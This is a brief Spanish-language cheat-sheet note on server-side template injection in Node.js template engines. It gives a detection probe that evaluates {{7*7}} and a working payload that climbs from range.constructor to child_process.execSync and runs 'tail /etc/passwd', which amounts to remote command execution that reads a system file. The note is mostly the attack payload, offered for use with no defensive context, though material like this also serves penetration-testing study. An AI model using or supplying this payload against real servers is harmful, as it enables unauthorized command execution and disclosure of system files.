# Server Site Template Injection ❮❯

Cuando en la web nos muestra en su output el input que hemos ingresado 

Esto seria para **Node.js**
❯ **{{7\*7}}**  Colocamos esta expresion y si nos mutesra en el output 49 quiere decir que si es vulnerable a SSTI
❯ **{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}** Nos ayuda a injectar comandos 





